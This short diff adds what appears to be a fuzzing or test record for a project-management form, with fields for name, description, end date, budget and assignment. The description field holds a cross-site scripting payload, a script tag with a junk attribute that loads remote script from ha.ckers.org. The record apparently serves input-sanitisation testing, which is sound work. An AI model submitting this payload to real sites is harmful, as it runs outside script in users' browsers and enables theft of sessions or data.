@@ -1,0 +1,6 @@
+name : 1UM:T'Q.9HH 
+desc : <SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+end : 11.7.2016
+budget : 97,225
+assignto[] : 1
+assignme : 1
